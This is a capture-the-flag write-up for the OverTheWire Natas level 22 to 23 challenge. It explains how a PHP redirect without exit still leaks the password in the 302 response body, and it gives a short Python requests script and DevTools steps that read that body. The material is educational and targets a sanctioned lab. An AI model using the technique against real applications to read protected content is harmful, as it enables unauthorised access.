# OverTheWire: Natas — Level 22 → Level 23

> **Vulnerability:** Client-Side Redirect Enforcement (Response Body Disclosure Before Redirect)                                                 
> **Skills:** HTTP redirect mechanics, Python `requests`, DevTools Network tab                        
> **Difficulty:** Easy                                                               
> **Official Page:** [Natas Level 22](https://overthewire.org/wargames/natas/natas22.html)

---

## Access

- **URL:** `http://natas22.natas.labs.overthewire.org`
- **Username:** `natas22`
- **Password:** *obtain from previous level*

---

## Task

Find the password for Level 23 by intercepting the body of an HTTP response that the server sends before issuing a redirect — a body that a normal browser never renders.

---

## Vulnerability

This level demonstrates **client-side redirect enforcement**. The server-side logic prints the password into the HTTP response body and then issues a `Location` header to redirect the user away. The developer assumed that any browser receiving a redirect would immediately follow it, discarding the current response body without ever rendering it. That assumption is the mistake. The redirect only *instructs* the client to navigate elsewhere — it does not prevent the server from having already written sensitive content into the response. Any HTTP client that chooses not to follow the redirect, or any tool that inspects the raw response before following it, will see the password in plain text in the body of the redirect response.

---

## Theory

### HTTP Redirects

When a server wants to send a client to a different URL, it responds with a redirect status code and a `Location` header pointing to the new URL.

| Status Code | Name | Meaning |
|---|---|---|
| `301` | Moved Permanently | The resource has permanently moved; cache the new URL |
| `302` | Found | Temporary redirect; go to `Location` but do not cache it |
| `303` | See Other | Redirect to `Location` using a GET request |
| `307` | Temporary Redirect | Same as 302 but method must not change |

For this level, a `302` is used. The critical point: **a redirect response is still a full HTTP response**. It has a status code, headers, and a body. The body exists even when the status is 302. Browsers discard that body automatically and follow the `Location` header. Most HTTP libraries do the same by default.

### What "Following a Redirect" Actually Means

When a browser or HTTP library follows a redirect automatically, it:

1. Receives the 302 response.
2. Reads the `Location` header.
3. Discards the response body of the 302.
4. Issues a new GET request to the URL in `Location`.

Step 3 is where the password is lost under normal conditions. The server has already written it — the client just never looks at it.

### Disabling Automatic Redirects in Python `requests`

| Parameter | Effect |
|---|---|
| `allow_redirects=True` (default) | Library follows all redirects; you see the final page |
| `allow_redirects=False` | Library stops at the first response; you see the 302 body |

Setting `allow_redirects=False` does not change what the server sends. It only changes whether the client follows the `Location` header. The raw response — including any body content — is fully available.

### Manual Approach via Browser DevTools

You do not need a script for this level. The same result is achievable in any browser:

1. Open DevTools (`F12`) and go to the **Network** tab.
2. Enable **Preserve log** so responses are not cleared on navigation.
3. Navigate to `http://natas22.natas.labs.overthewire.org/?revelio=1`.
4. Find the 302 response in the Network tab, click it, and open the **Response** tab.
5. The password is in the response body.

The script approach is faster and more explicit for documenting the technique.

---

## Solution

### Step 1 — Read the page source

Log in and navigate to `http://natas22.natas.labs.overthewire.org`. The page appears blank. Use **View Page Source** (`Ctrl+U`) to read the PHP logic.

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // if "revelio" is set, check if user is admin
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
?>

<html>
<head>
<!-- ... -->
</head>
<body>
<?php
    if(array_key_exists("revelio", $_GET)) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas23\n";
        print "Password: <censored></pre>";
    }
?>
</body>
```

> **What to notice:** Read this carefully — the order of execution is the entire vulnerability. The `header("Location: /")` call is issued at the top of the script. But PHP's `header()` does not stop execution or prevent the rest of the script from running. The HTML body, including the password, is rendered into the response buffer regardless. The server sends both the `Location` header *and* the password in the same response. Only a client that blindly follows the redirect will miss it.

---

### Step 2 — Confirm the behaviour manually (optional but instructive)

Before writing a script, verify this in browser DevTools:

1. Open DevTools (`F12`) → **Network** tab.
2. Tick **Preserve log**.
3. Navigate to `http://natas22.natas.labs.overthewire.org/?revelio=1` (with your credentials in the URL or via the browser's HTTP Basic Auth prompt).
4. In the Network tab, find the first request — it should show status `302`.
5. Click it → **Response** tab.

> **What to notice:** The response body of the 302 already contains the HTML with the password printed in it. The browser followed the redirect and showed you a blank page, but the raw response never left the server empty.

---

### Step 3 — Write and run the exploit script

```python
import requests

target = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
auth   = ('natas22', '<natas22_password>')

session = requests.Session()

response = session.get(target, auth=auth, allow_redirects=False)

print(f"[*] Status code: {response.status_code}")
print(f"[*] Location header: {response.headers.get('Location', 'none')}")
print("\n[*] Response body:")
print(response.text)
```

Replace `<natas22_password>` with the password obtained from Level 21, then run:

```bash
python3 exploit.py
```

```
[*] Status code: 302
[*] Location header: /

[*] Response body:
<html>
<head>
...
</head>
<body>
You are an admin. The credentials for the next level are:<br>
<pre>Username: natas23
Password: <the_password></pre>
</body>
</html>
```

> **What to notice:** The status code is `302` — this is a redirect response. The `Location` header confirms the server wanted to send us to `/`. But because `allow_redirects=False` was set, the library stopped here and exposed the full body. The password was in this response the entire time — any browser that visited this URL simply never saw it because it followed the redirect obediently.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

- A redirect does not erase or prevent the response body — it only instructs the client to navigate elsewhere. If a server renders sensitive content before issuing a `Location` header, that content is already in the response and any non-compliant or manually configured client can read it.
- PHP's `header()` function queues an HTTP header but does not halt script execution; code after a `header("Location: ...")` call continues to run and its output enters the response body, making it trivially easy to produce this class of vulnerability by accident.
- In real applications, a redirect intended as an access control gate must be followed immediately by `exit` or `die` — otherwise the remainder of the page renders into the response regardless of the redirect header.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Omitting `?revelio=1` from the URL | The PHP block that prints the password is never entered; the response body is empty | Include `?revelio=1` as a GET parameter in the target URL |
| Leaving `allow_redirects` at its default (`True`) | The library follows the 302 to `/`; the response you inspect is the blank index page | Explicitly pass `allow_redirects=False` to the `get()` call |
| Inspecting `response.url` instead of `response.text` | `response.url` shows the final URL after redirects; with `allow_redirects=False` it shows the original URL — neither gives you the password | Read `response.text` to see the raw response body |
| Using a browser without opening DevTools Network tab first | The browser follows the redirect automatically; the page appears blank with no visible password | Either use the script, or open DevTools → Network → Preserve log before navigating |
| Checking the wrong Network tab entry | The final `/` response (200) is blank; the password is in the earlier 302 entry | In DevTools, click the first request in the waterfall — the one with status 302 — not the redirected-to page |
